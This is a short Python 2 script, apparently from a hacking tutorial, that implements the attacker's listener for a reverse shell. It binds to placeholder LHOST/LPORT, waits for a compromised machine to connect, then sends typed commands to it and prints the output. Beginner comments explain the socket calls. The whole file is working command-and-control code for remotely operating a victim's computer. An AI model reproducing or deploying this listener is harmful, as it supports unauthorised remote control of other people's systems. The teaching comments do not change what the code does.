#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1)  # set socket options
# (we are setting options so that even if the socket losses the connection it could be reused)
listener.bind(("LHOST",LPORT))
# bind(("bind_address",listener_port))
listener.listen(0)
print("[+] Waiting for incoming connection")
# listen(backlog=number of connection that can be queued before system starts to refuse the connection)
connection, address = listener.accept()  # to tell your system to accept the connection
# accept returns two values i.socket option which allow us to send or recieve the data
# ii.address that is bound to the connection
print("[+] Got a connection from "+str(address))

while True:
	command = raw_input(">>")
	connection.send(command)
	result = connection.recv(1024)
	print(result)